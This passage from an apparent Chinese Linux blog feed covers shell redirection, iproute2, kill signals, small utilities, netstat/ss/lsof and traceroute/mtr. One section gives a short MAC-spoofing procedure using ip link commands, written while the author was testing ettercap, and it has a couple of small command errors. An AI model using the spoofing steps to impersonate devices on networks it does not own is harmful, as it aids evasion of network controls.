class="built_in">test</span>`</span></span><br><span class="line">5  13  61 test</span><br><span class="line">9  20 198 test.py</span><br><span class="line">3   4  26 test_subshell.sh</span><br></pre></td></tr></table></figure></p></li><li><p>提取日期信息来生成日志文件名</p><p><code>touch $(date +%y%m%d%H%M).log</code></p></li></ol><h3 id="注意">注意</h3><p>命令替换会创建一个子 shell 来运行对应的命令。子shell（subshell）是由运行该脚本的 shell 所创建出来的一个独立的子shell（child shell）。正因如此，由该子 shell 所执行命令是无法使用脚本中所创建的变量的。</p><h2 id="设备文件">设备文件</h2><p>先了解一下设备文件，在 Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。</p><p>设备文件：</p><p><ahref="https://blog.csdn.net/longerzone/article/details/12948925">Linux下的两个特殊的文件 -- /dev/null 和 /dev/zero 简介及对比</a></p><h2 id="文件描述符">文件描述符</h2><p>文件描述符（filedescriptor）是内核为了高效管理已被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O 操作的系统调用都通过文件描述符。系统创建的每个进程默认会打开 3个文件，标准输入(0)、标准输出(1)、标准错误(2)。如果此时去打开一个新的文件，它的文件描述符会是3。POSIX 标准要求每次打开文件时（含socket）必须使用当前进程中最小可用的文件描述符号码，因此，在网络通信过程中稍不注意就有可能造成串话。</p><table><thead><tr class="header"><th>文件描述符</th><th>用途</th><th>POSIX 名称</th><th>stdio 流</th></tr></thead><tbody><tr class="odd"><td>0</td><td>标准输入</td><td>STDIN_FILENO</td><td>stdin0</td></tr><tr class="even"><td>1</td><td>标准输出</td><td>STDOUT_FILENO</td><td>stdout</td></tr><tr class="odd"><td>2</td><td>标准错误</td><td>STDERR_FILENO</td><td>stderr</td></tr></tbody></table><p>Usage:</p><ul><li>The general form of this one is M&gt;/dev/null, where "M" is a filedescriptor number. This will redirect the file descriptor, "M", to/dev/null.</li><li>The general form of this one is M&gt;&amp;N, where "M" &amp; "N" arefile descriptor numbers. It combines the output of file descriptors "M"and "N" into a single stream.</li></ul><ol type="1"><li><p>将标准输出重定向到空设备文件 <code>&gt;/dev/null</code> 或者<code>1&gt;/dev/null</code> if a number isn't explicitly given, thennumber 1 is assumed by the shell (bash)</p></li><li><p>将标准错误重定向到空设备文件 <code>2&gt;/dev/null</code></p></li><li><p>混合标准错误和标准输出到一个流 <code>2&gt;&amp;1</code>，即：将标准错误和标准输出混合在一个流，然后在进行重定向等，如：<code>cat file &gt; /dev/null 2&gt;&amp;1</code></p></li><li><p>混合标准错误和标准输出到一个流(简写)<code>&amp;&gt;/dev/null</code> This is just an abbreviation for&gt;/dev/null 2&gt;&amp;1. It redirects file descriptor 2 (STDERR) anddescriptor 1 (STDOUT) to /dev/null.</p></li></ol><p>个人习惯使用：<code>&gt;/dev/null</code> 和<code>2&gt;/dev/null</code> 和 <code>&amp;&gt;/dev/null</code>分别实现重定向标准输出、标准错误、混合 三种目的。</p><h2 id="参考资料">参考资料</h2><p><a href="https://www.cnblogs.com/irockcode/p/6619049.html">重定向stdin stdout stderr</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ioredirect </tag>
            
            <tag> pipe </tag>
            
            <tag> fd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iproute2</title>
      <link href="/blog/2020/07/13/linux/tools/iproute2/"/>
      <url>/blog/2020/07/13/linux/tools/iproute2/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>Linux 上管理网络的工具有两种，一个是 net-tools 中提供的ifconfig，一个是 iproute2 提供的 ip addr。net-tools 起源与 BSD，自 2001年起，Linux 社区就停止了对这个工具的维护，而 iproute2旨在取代这个工具，并提供一些新功能。</p><p>iproute2 是 linux 下管理控制 TCP/IP网络和流量控制的新一代工具包，旨在替代老派的工具链net-tools，即大家比较熟悉的 ifconfig，arp，route，netstat 等命令。</p><p>虽然 net-tools很早就不维护了，但是目前很多发行版还是默认安装着它，因此，我也没觉得怎么样。今天，由于需要测试<code>ettercap</code>， 我怀疑是 Arch官方仓库里面那个包打的有问题，我反馈了，还没修复，因此，直接上 kali，看本机 IP 的时候，我发现 ifconfig 没了，于是一番查询，知道，kali推荐使用的 <code>ip</code>， 弃用了 net-tools了，因此我觉得有必要学习一波的 <code>ip</code> 命令了。</p><p>net-tools 通过 <code>procfs(/proc)</code> 和 <code>ioctl</code>系统调用去访问和改变内核网络配置，而 iproute2 则通过 netlink套接字接口与内核通信。</p><h2 id="语法与使用">语法与使用</h2><p><code>man ip</code> 可得:</p><p><code>ip [ OPTIONS ] OBJECT &#123; COMMAND | help &#125;</code></p><p><code>OBJECT</code> 是你要管理的对象类型，最常用的几个是：</p><ul><li><code>link(l)</code> 显示和修改网卡（例如启用/禁用某个网络设备。修改 mac 地址）</li><li><code>address(a)</code> 显示和修改 IP 地址</li><li><code>route(r)</code> 显示和修改路由表</li><li><code>neigh(n)</code> 显示和操作相邻对象（ARP 表）</li></ul><p><code>OBJECT</code> 可以以全名或者缩写的形式使用。可以通过<code>ip OBJECT help</code>（将 OBJECT 更换为你要查询的对象）来显示该对象的命令和参数列表。</p><p>注意：当配置网卡的时候，需要以 root 身份或者 <code>sudo</code>权限来执行命令，否则会报错权限不足。</p><p>通过 <code>ip</code>命令在终端进行的配置不是永久的，系统重启之后，所有的改变都将丢失。如果想要永久地配置，你需要编辑你所使用的发行版对应的特定的配置文件或者添加命令到开机脚本的方式。</p><h2 id="显示和修改-ip-地址">显示和修改 IP 地址</h2><p>命令格式： <code>ip addr [ COMMAND ] ADDRESS dev IFNAME</code></p><p><code>addr</code> 对象最常用的命令是 <code>show</code>,<code>add</code> 和 <code>del</code>。</p><h3 id="显示所有-ip-地址的信息">显示所有 IP 地址的信息</h3><p>显示所有的网卡以及 IP 地址类型列表：<code>ip addr show</code>（去掉<code>show</code> 结果一样） 如果你想要只显示 IPv4 或者 IPv6的地址，那么使用 <code>ip -4 addr</code> 或 <code>ip -6 addr</code></p><h3 id="显示单个网卡的信息">显示单个网卡的信息</h3><p>使用 <code>ip addr show dev</code> 后面跟着网卡名，例如：<code>eno1</code> 网卡</p><p><code>ip addr show dev eth0</code>（去掉 dev 结果一样）</p><h3 id="设置网卡-ip-地址">设置网卡 IP 地址</h3><p><code>ip addr add ADDRESS dev IFNAME</code></p><p><code>ADDRESS</code> 是你想要赋值给网卡的 IP <code>IFNAME</code>是网卡的名称</p><p>例如： 将子网掩码为 24 的 IP：<code>192.168.121.45</code> 赋值给网卡<code>eno1</code></p><p><code>sudo ip address add 192.168.121.45/24 dev eno1</code></p><h3 id="赋值多个-ip-给同一个网卡">赋值多个 IP 给同一个网卡</h3><p>网卡和 IP 地址并不是一一对应关系。通过 ip 命令可以临时设置多 IP同网卡，但是重启后设置也是会消失的。</p><ol type="1"><li><p>多网卡同 IP： 通过绑定多个网卡作为一个逻辑网口并配置单个的 IP地址，大幅提升服务器的网络吞吐性能。</p></li><li><p>同网卡多 IP：</p><p>在实施服务器虚拟化时，单个物理网卡往往是有多个 IP地址，多个虚拟服务器在同一物理硬件上运行，每个虚拟服务器都需要自己的 IP地址。</p></li></ol><p>用法：直接为 网卡赋值多次不同 ip 即可，比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip address add 192.168.121.241/24 dev eno1</span><br><span class="line">sudo ip address add 192.168.121.45/24 dev eno1</span><br></pre></td></tr></table></figure><p>可以通过 <code>ip -4 addr show dev eth0</code> 或<code>ip -4 a show dev eth0</code> 确认 IP 赋值操作已完成。</p><h3 id="删除网卡的-ip-地址">删除网卡的 IP 地址</h3><p>语法： <code>ip addr dev ADDRESS dev IFNAME</code></p><p>例如：移除 <code>eno1</code> 网卡的 <code>192.168.121.45/24</code>地址：</p><p><code>sudo ip address del 192.168.121.45/24 dev eno1</code></p><h2 id="显示网卡">显示网卡</h2><p>命令: <code>ip link show</code> 该命令不会输出该网卡关联的 IP地址。</p><p>获得某个网卡的信息：<code>ip link show dev</code>例如：<code>ip link show dev eno1</code></p><h3 id="启用禁用网卡">启用禁用网卡</h3><p>命令： <code>ip link set dev &#123;DEVICE&#125; &#123;up|down&#125;</code></p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link set dev eno1 down</span><br><span class="line">ip link set dev eno1 up</span><br></pre></td></tr></table></figure><h3 id="修改网卡的-mac-地址">修改网卡的 MAC 地址</h3><p>命令：<code>ip link set dev eno1 address XX:XX:XX:XX:XX:XX</code></p><h2 id="显示路由表">显示路由表</h2><p>命令： <code>ip route</code></p><p>一般常用它来代替 <code>netstat -rn</code> 或 <code>route</code>查看网关地址。 输出中 <code>via</code>后面的地址即为网关地址（处于隐私考虑，我将其用 xxx 替换了）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ip route</span></span><br><span class="line">default via xxx.xxx.xxx.xxx dev wlo1 proto dhcp metric 600</span><br><span class="line">10.252.248.0/21 dev wlo1 proto kernel scope link src 10.252.254.67 metric 600</span><br></pre></td></tr></table></figure><h2 id="显示-arp-缓存或者-arp-表">显示 ARP 缓存或者 ARP 表</h2><p><code>ip n</code> 或者 <code>ip neigh show</code></p><p>可以用来代替</p><h2 id="mac-欺骗的操作流程">MAC 欺骗的操作流程</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip link show eno1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 根据上一步的结果查看你的原 MAC 地址，并记录</span></span></span><br><span class="line">ip link set dev eno1 down</span><br><span class="line">ip link set dev eno1 address XX:XX:XX:XX:XX:XX</span><br><span class="line">ip link set dev eno1 up</span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><p><a href="https://linuxize.com/post/linux-ip-command/">Linux ipCommand with Examples</a> <ahref="https://www.it-swarm.asia/zh/ip/%20%e4%b8%80%e4%b8%aa%e7%bd%91%e5%8d%a1%e5%8f%af%e4%bb%a5%e6%9c%892%e4%b8%aaip%e5%9c%b0%e5%9d%80%e5%90%97%ef%bc%9f/960518481/">一个网卡可以有2 个 IP 地址吗？</a> <ahref="https://www.jianshu.com/p/c3278e44ee9d">多网卡同 IP 和同网卡多 IP技术</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> iproute2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kill 命令</title>
      <link href="/blog/2020/07/13/linux/tools/kill_cmd/"/>
      <url>/blog/2020/07/13/linux/tools/kill_cmd/</url>
      
        <content type="html"><![CDATA[<h2 id="kill-command"><code>kill</code> Command</h2><p><code>kill</code> 是大多数 Bourne-derived shells，诸如：bash、zsh 等shell 的内置命令。 shell 内置版和 <code>/bin/kill</code>独立可执行文件版的 kill，在行为有些不同。</p><p>使用 <code>type</code> 命令显示你系统上包含 <code>kill</code>的所有位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> -a <span class="built_in">kill</span></span></span><br><span class="line">kill is a shell builtin</span><br><span class="line">kill is /usr/bin/kill</span><br></pre></td></tr></table></figure><p>以上的输出说明 shell内置命令比独立可执行文件具有较高的优先级。当你输入 <code>kill</code>默认使用前者，如果你想要使用二进制版（后者），那你需要输入文件的全路径<code>/usr/bin/kill</code> （/usr目录下表明是用户的，否则是系统的）。本文将讨论默认用的 Bash 内置版的kill</p><h2 id="syntax">syntax</h2><p><code>kill [OPTIONS] [PID]...</code></p><p><code>kill</code>命令发送一个信号到制定的进程或者进程组，使它们根据信号来行动。当没指定信号时，默认使用 <code>-15</code> （-TERM）</p><p>使用 <code>kill -l</code> 可以得到所有可用的信号的列表, 建议你使用<code>kill -l|sed "s/ /\n/g"|nl</code> ， 这样我们可以看序号。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">kill</span> -l</span></span><br><span class="line">HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM STKFLT CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL PWR SYS</span><br></pre></td></tr></table></figure><p>信号可以通过 3 种方式指定：</p><ol type="1"><li>Using number (e.g., <code>-1</code> or <code>-s 1</code>).</li><li>Using the "SIG" prefix (e.g., <code>-SIGHUP</code> or<code>-s SIGHUP</code>).</li><li>Without the "SIG" prefix (e.g., <code>-HUP</code> or<code>-s HUP</code>).</li></ol><p>下面的指令是等价的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kill -1 PID_NUMBER</span><br><span class="line">kill -SIGHUP PID_NUMBER</span><br><span class="line">kill -HUP PID_NUMBER</span><br></pre></td></tr></table></figure><h2 id="常见信号">常见信号</h2><p>linux 进程也有三种方式来处理收到的信号：</p><ol type="1"><li>忽略信号，即对信号不做任何处理，其中，有两个信号不能忽略：SIGKILL 及SIGSTOP；</li><li>捕捉信号。定义信号处理函数，当信号发生时，执行相应的处理函数；</li><li>执行缺省操作，Linux 对每种信号都规定了默认操作。</li></ol><p>Linux进程对实时信号的缺省反应是进程终止。但是对于高性能服务器编程来说，这是致命的缺陷，对于这类服务器需要保证在收到各种信号后仍然可以可靠运行，所以我们需要在理解各种信号的缘由和正确的处理方式。</p><p>SIGHUP 和控制台操作有关，当控制台被关闭时系统会向拥有控制台 sessionID的所有进程发送 HUP 信号，默认 HUP 信号的 action 是exit，如果远程登陆启动某个服务进程并在程序运行时关闭连接的话会导致服务进程退出，所以一般服务进程都会用nohup 工具启动(该命令就是让忽略该信号)或写成一个 daemon(利用 setsid进行)。</p><ol start="0" type="1"><li><code>SIGHUP</code></li></ol><blockquote><p>The SIGHUP signal is sent to a process when its controlling terminalis closed. It was originally designed to notify the process of a serialline drop (a hangup). In modern systems, this signal usually means thatthe controlling pseudo or virtual terminal has been closed. Many daemonswill reload their configuration files and reopen their logfiles insteadof exiting when receiving this signal. <code>nohup</code> is a commandto make a command ignore the signal.</p></blockquote><ol type="1"><li><p><code>SIGINT</code> 终止进程，通常我们的 Ctrl+C就发送的这个消息。Ctrl+C 终止前台进程</p></li><li><p><code>SIGQUIT</code> 和 SIGINT 类似, 但由 QUIT 字符(通常是 Ctrl-/ )来控制. 进程收到该消息退出时会产生 core 文件。</p></li><li><p><code>SIGKILL</code> 消息编号为 9，我们经常用 kill -9来杀死进程发送的就是这个消息，程序收到这个消息立即无条件终止，这个消息不能被捕获，封锁或者忽略，所以是杀死进程的终极武器。</p></li><li><p><code>SIGTERM</code> 是不带参数时 kill 默认发送的信号，默认是Gracefully stop a process.（先关闭和其有关的程序，再将其关闭）</p></li><li><p><code>SIGTSTP</code></p><blockquote><p>The SIGTSTP signal is sent to a process by its controlling terminalto request it to stop (terminal stop). It is commonly initiated by theuser pressing <code>Ctrl+z</code>. Unlike SIGSTOP, the process canregister a signal handler for, or ignore, the signal.</p></blockquote><p>可以使用 <code>jobs</code> 查看后台命令，使用 <code>fg</code>将对应序号挂起的进程调回前台.</p></li><li><p>SIGCONT</p><blockquote><p>The SIGCONT signal instructs the operating system to continue(restart) a process previously paused by the SIGSTOP or SIGTSTP signal.One important use of this signal is in job control in the Unixshell.</p></blockquote><p>除了其他目的，<code>SIGSTOP</code> 和 <code>SIGCONT</code> 用于 Unixshell 中的作业控制，无法捕获或忽略 <code>SIGCONT</code> 信号。</p></li></ol><h2 id="使用-kill-终止命令">使用 <code>kill</code> 终止命令</h2><h3 id="kill-任意进程">kill 任意进程</h3><p>要终止一个进程，首先需要它的进程 id， 也就是 PID。你可以使用<code>top, ps, pidof，pgrep</code> 等诸多命令。</p><p>我一般常用三个： 1. 如果是看内存占用等，一般先运行<code>htop</code>,然后找到 PID 2.如果只是要杀死某谢特定的进程，使用(注意 可用 tab 键补全要找的名字) 1.<code>ps aux|grep firefox</code> 2. <code>pidof firefox</code></p><p>然后再用 kill 通过发送 <code>TERM</code> 信号无条件杀死这些进程<code>kill -9 PID</code></p><h3 id="kill-后台任务进程">kill 后台任务进程</h3><p>通过 <code>jobs</code> 命令查看 job 号（假设为 num），然后执行<code>kill %num</code>. 如果只有一个后台任务的化，那就是<code>kill %1</code> 直接上</p><h2 id="总结">总结</h2><p><code>kill</code>命令通常用来向进程发送信号，最常用的信号是：<code>SIGKILL</code> 或<code>-9</code> ,即：无条件终止进程。</p><h2 id="参考资料">参考资料</h2><p><a href="https://linuxize.com/post/kill-command-in-linux/">KillCommand in Linux</a></p><p><a href="https://en.wikipedia.org/wiki/Signal_(IPC)">Signal (IPC)wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 一些实用小命令</title>
      <link href="/blog/2020/07/13/linux/tools/little_cmds/"/>
      <url>/blog/2020/07/13/linux/tools/little_cmds/</url>
      
        <content type="html"><![CDATA[<h2 id="echo">echo</h2><ol type="1"><li><p>echo命令可用单引号或双引号来划定文本字符串。如果在字符串中用到了它们，你需要在文本中使用其中一种引号，而用另外一种来将字符串划定起来</p></li><li><p>如果想把文本字符串和命令输出显示在同一行中，该怎么办呢？可以用<code>echo</code>语句的<code>-n</code>参数</p><p><code>-n：do not output the trailing newline</code></p><p>例如：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo -n &quot;The time and date are:&quot;</span><br><span class="line">date</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="expr">expr</h2><h3 id="介绍">介绍</h3><p>expr 命令是一个手工命令行计数器，用于在 UNIX/LINUX下求表达式变量的值，一般用于整数值，也可用于字符串。</p><p><code>expr 表达式</code></p><p>表达式说明:</p><ul><li><strong>用空格隔开每个项</strong>;</li><li><strong>用 <code>\</code> (反斜杠) 放在 shell特定的字符前面</strong>;</li><li>对包含空格和其他特殊字符的字符串要用引号括起来;</li><li><code>expr</code> 会输出结果，所以不用再单独 <code>echo</code></li></ul><h3 id="使用">使用</h3><p>1、计算字串长度 <code>expr length 字符串</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">expr</span> length <span class="string">&quot;this  is a test&quot;</span></span></span><br><span class="line">14</span><br></pre></td></tr></table></figure><p>2、抓取字串 <code>expr substr 字符串 start_index length</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">expr</span> substr <span class="string">&quot;this  is a test&quot;</span>  3  5</span></span><br><span class="line">is  is</span><br></pre></td></tr></table></figure><p>3、抓取第一个字符数字串出现的位置<code>expr index 字符串 字符</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">expr</span> index <span class="string">&quot;sarasara&quot;</span> a</span></span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>4、整数运算 <code>%， *， /，+， -</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">expr</span> 30 \* 3 (使用乘号时，必须用反斜线屏蔽其特定含义。因为shell可能会误解显示星号的意义)</span></span><br><span class="line">90</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">expr</span> 30 * 3</span></span><br><span class="line">expr: Syntax error</span><br></pre></td></tr></table></figure><h2 id="more">more</h2><p>more命令用于在命令提示符中查看文本文件，每次显示一个屏幕，以防文件较大(例如日志文件)。</p><p>使用：</p><ol type="1"><li>直接加文件参数 <code>more filename</code></li><li>管道 例如：cat filename|nl|more</li></ol><p>常用快捷键：</p><p><code>q</code> 退出 <code>space</code> 显示后面 k行文本，默认为当前屏幕大小。 <code>b 或者 ctrl+b</code>回退一屏文字，<strong>注意</strong>：此快捷键只在与文件使用时起作用，例如：<code>more filename</code>，而与管道使用时无作用。</p><h2 id="last">last</h2><p>该命令用来列出目前与过去登录系统的用户相关信息。指令英文原义：showlisting of last logged in users.</p><h2 id="time">time</h2><p>执行命令，并测试给出特定指令执行时所需消耗的时间及系统资源等 time指令可以显示的资源有四大项，分别是：</p><ol type="1"><li>Time resources</li><li>Memory resources</li><li>IO resources</li><li>Command info</li></ol><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time <span class="built_in">date</span></span></span><br><span class="line">Sat 01 Aug 2020 03:41:58 PM CST</span><br><span class="line">date  0.00s user 0.00s system 80% cpu 0.001 total</span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://www.runoob.com/linux/linux-comm-time.html">Linuxtime 命令</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Check for Listening Ports</title>
      <link href="/blog/2020/07/13/linux/tools/netstat_lsof/"/>
      <url>/blog/2020/07/13/linux/tools/netstat_lsof/</url>
      
        <content type="html"><![CDATA[<h2 id="netstat">netstat</h2><h3 id="简介">简介</h3><p>由 <code>man netstat</code> 得:</p><blockquote><p>netstat - Print network connections, routing tables, interfacestatistics, masquerade connections, and multicast memberships</p></blockquote><h3 id="使用">使用</h3><p>常见参数</p><ol type="1"><li><p>-a 选项会列出 tcp, udp 和 unix 协议下所有套接字的所有连接。</p><p><code>netstat -a</code></p></li><li><p>只列出 TCP 或 UDP 协议的连接</p><p>使用 -t 选项列出 TCP 协议的连接，可和 -a 选项配合使用<code>netstat -at</code> 使用 -u 选项列出 UDP 协议的连接<code>netstat -au</code></p></li><li><p>禁用反向域名解析，加快查询速度</p><p>默认情况下 netstat 会通过反向域名解析查找每个 IP地址对应的主机名，会降低查找速度。n 选项可以禁用此行为，并且用户 ID和端口号也优先使用数字显示。 <code>netstat -na</code></p></li><li><p>只列出监听中的连接 <code>-l</code>选项可以只列出正在监听的连接（不能和 a 选项同时使用）</p><p><code>netstat -nl</code></p></li><li><p>获取进程名、进程号以及用户 ID <code>-p</code>选项可以查看进程信息（此时 netstat 应尽量运行在 root权限之下，否则不能得到运行在 root 权限下的进程名）</p><p><code>netstat -np</code></p></li><li><p>显示路由信息 使用 <code>-r</code> 选项打印内核路由信息，与 route命令输出一样。 <code>netstat -rn</code></p></li><li><p>网络接口信息 <code>-i</code>选项可以输出网络接口设备的统计信息，结合上 <code>-e</code> 选项，等于<code>ifconfig</code> 命令的输出。</p></li><li><p>获取网络协议的统计信息 <code>-s</code>选项可以输出针对不同网络协议的统计信息，包括 Ip、Icmp、Tcp 和 Udp等。</p></li></ol><h3 id="应用">应用</h3><ol type="1"><li><p>查看网关路由器地址</p><p><code>netstat -rn</code> 相当于 <code>route -n</code></p></li><li><p>找出程序运行的端口与 PID</p><p>在用户权限下，并不是所有的进程都能找到，没有权限的会不显示。需要使用root 权限查看所有的信息。<code>sudo netstat -nap | grep ssh</code></p></li><li><p>解除端口占用（杀死占用端口的程序）<code>netstat -nap|grep 端口</code> <code>kill -9 PID</code></p></li></ol><h2 id="ss-命令">ss 命令</h2><p>netstat 从 proc 文件系统获取所需要的信息，而 ss 利用 netlink机制，与内核通信，通过 TCP 协议栈中 tcp_diag模块获取第一手的内核信息。</p><p>ss 旨在替代 netstat， ss 更为强大和高效，而且从 netstat 迁移至 ss，几乎不需要费力。</p><p>ss 的 <code>-t, -u, -a, -n, -l, -p, -e</code> 选项均与<code>netstat</code> 一致（注：<code>-r</code> 在 ss中是尽力进行域名解析的意思）</p><h2 id="lsof">lsof</h2><p>Linux一切皆文件，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。例如：传输控制协议(TCP) 和用户数据报协议 (UDP)套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof 工具能够查看这个列表对系统监测以及排错将是很有帮助的。</p><p>lsof（list open files）是一个列出当前系统打开文件的工具</p><p>常用选项：<code>-i</code></p><ol type="1"><li><p>列出所有的网络连接 <code>lsof -i</code></p></li><li><p>列出所有 tcp 网络连接信息（udp 同样使用，只需将 tcp 改为udp）</p><p><code>lsof -i tcp</code></p></li><li><p>列出谁在使用某个端口</p><p><code>lsof -i :3306</code></p></li><li><p>列出谁在使用某个特定的 tcp 端口（udp 同样使用，只需将 tcp 改为udp）</p><p><code>lsof -i tcp:10808</code></p></li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://linuxize.com/post/check-listening-ports-linux/">Howto Check for Listening Ports in Linux (Ports in use)</a></li><li><ahref="https://www.cnblogs.com/pc-boke/articles/10012112.html">netstat 和lsof 的区别</a></li><li><a href="https://linux.cn/article-2434-1.html">netstat 的 10个基本用法</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> netstat </tag>
            
            <tag> ss </tag>
            
            <tag> lsof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>traceroute &amp; mtr</title>
      <link href="/blog/2020/07/13/linux/tools/traceroute/"/>
      <url>/blog/2020/07/13/linux/tools/traceroute/</url>
      
        <content type="html"><![CDATA[<h2 id="traceroute">traceroute</h2><blockquote><p>'traceroute' prints a trace of the route IP packets are travelling toa remote host.</p></blockquote><p>下面是我从 <code>man traceroute</code>摘录出来的比较有价值的内容：</p><p>This program attempts to trace the route of an IP packet. it wouldfollow to some internet host by launching probe packets with a small ttl(time to live), then listening for an ICMP "time exceeded" reply from agateway.</p><p>We start our probes with a ttl of one and increase by one until weget an ICMP "port unreachable" (or TCP reset), which means we got to the"host", or hit a max (which defaults to 30 hops). <strong>Three probes(by default)</strong> are sent at each ttl setting and a line is printedshowing the ttl, address of the gateway and round trip time of eachprobe.</p><p>If the probe answers come from different gateways, the address ofeach responding system will be printed. If there is no response within acertain timeout, an "*" (asterisk) is printed for that probe.</p><p>We don't want the destination host to process the UDP probe packets,so the destination port is set to an unlikely value (you can change itwith the -p flag). There is no such a problem for ICMP or TCPtracerouting (for TCP we use half-open technique, which prevents ourprobes to be seen by applica‐ tions on the destination host).</p><p>In the modern network environment the traditional traceroute methodscan not be always applicable, because of widespread use of firewalls.Such firewalls filter the "unlikely" UDP ports, or even ICMP echoes. Tosolve this, some additional tracerouting methods are implemented(including tcp, udp), Such methods try to use particular protocol andsource/destination port, in order to bypass firewalls (to be seen byfirewalls just as a start of allowed type of a network session).</p><h3 id="使用">使用</h3><p><code>traceroute [-q nqueries][-M method] host</code></p><p><code>-q nqueries</code>: 指定 n 次查询，默认是 3 次。<code>-M method</code>： 可以有 <code>-I</code>: Use ICMP ECHO forprobes, <code>-T</code>:Use TCP SYN for probes</p><h2 id="mtr">mtr</h2><p><code>mtr</code> 是 my traceroute 的缩写。</p><ul><li><blockquote><p>mtr combines the functionality of the traceroute and ping programs ina single network diagnostic tool.</p></blockquote></li></ul><h3 id="使用-1">使用</h3><p><code>mtr www.baidu.com</code></p><p>结果的表头：<code>Host Loss% Snt Last Avg Best Wrst StDev</code></p><p>表头参数解释：</p><ul><li>主机 IP 地址</li><li>丢包率：Loss</li><li>已发送的包数：Snt</li><li>最后一个包的延时：Last</li><li>平均延时：Avg</li><li>最低延时：Best</li><li>最差延时：Wrst</li><li>方差（稳定性）：StDev</li></ul><p><code>-r, --report</code> This option puts mtr into report mode. Whenin this mode, mtr will run for the number of cycles specified by the -coption, and then print statistics and exit.</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> traceroute </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 入门</title>
      <link href="/blog/2020/07/13/programming/shell/0.intro/"/>
      <url>/blog/2020/07/13/programming/shell/0.intro/</url>
      
